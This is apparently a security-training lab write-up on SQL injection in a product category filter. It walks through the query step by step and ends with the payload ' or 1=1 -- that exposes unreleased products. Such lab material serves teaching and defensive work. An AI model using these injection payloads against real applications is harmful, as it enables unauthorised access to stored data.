This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products. 

End goal: display all products both released and unreleased.

Analysis:
--------

SELECT * FROM products WHERE category = 'Gifts' AND released = 1

SELECT * FROM products WHERE category = ''' AND released = 1

SELECT * FROM products WHERE category = ''--' AND released = 1

SELECT * FROM products WHERE category = ''

SELECT * FROM products WHERE category = '' or 1=1 --' AND released = 1
